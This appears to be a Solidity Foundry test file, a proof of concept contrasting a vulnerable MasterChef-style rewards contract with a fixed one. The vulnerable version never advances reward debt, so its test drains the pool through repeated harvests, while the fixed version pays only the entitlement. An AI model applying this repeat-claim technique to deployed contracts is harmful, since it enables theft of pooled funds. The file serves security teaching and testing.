// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, VulnerableChef, SafeChef} from "../src/rewards/Chef.sol";

/// PoC for MasterChef-style reward-debt desync (double/repeat-claim).
///   forge test --match-contract IncorrectRewardAccounting -vvv
///
/// Invariant (SC02): after a harvest, the staker's claimable `pending` must drop to zero — total
/// rewards paid to a staker can never exceed their accrued share. The vulnerable chef forgets to
/// advance rewardDebt, so the same pending is paid repeatedly; resetting the debt holds.
///
/// See docs/exploits/incorrect-reward-accounting.md
contract IncorrectRewardAccountingTest is Test {
    MockERC20 reward;
    address attacker = makeAddr("attacker");

    function setUp() public {
        reward = new MockERC20();
    }

    function test_vulnerable_repeatHarvestDrainsPool() public {
        VulnerableChef chef = new VulnerableChef(IERC20(address(reward)));
        reward.mint(address(chef), 1000e18); // reward pool

        // Attacker stakes 100; rewards accrue so their fair pending == 10.
        vm.prank(attacker);
        chef.deposit(100e18);
        chef.accrue(1e11); // pending = 100e18 * 1e11 / 1e12 = 10e18

        assertEq(chef.pending(attacker), 10e18, "fair entitlement is 10");

        // Harvest 5 times: rewardDebt never advances, so each call pays the full 10 again.
        for (uint256 i = 0; i < 5; i++) {
            vm.prank(attacker);
            chef.harvest();
        }

        assertEq(reward.balanceOf(attacker), 50e18, "attacker claimed 5x their entitlement");
    }

    function test_safe_harvestZeroesPending() public {
        SafeChef chef = new SafeChef(IERC20(address(reward)));
        reward.mint(address(chef), 1000e18);

        vm.prank(attacker);
        chef.deposit(100e18);
        chef.accrue(1e11); // pending = 10e18

        vm.prank(attacker);
        chef.harvest();
        assertEq(reward.balanceOf(attacker), 10e18, "paid exactly the entitlement");
        assertEq(chef.pending(attacker), 0, "pending reset to zero after harvest");

        // Repeat harvests pay nothing.
        vm.prank(attacker);
        chef.harvest();
        assertEq(reward.balanceOf(attacker), 10e18, "no double-claim");
    }
}
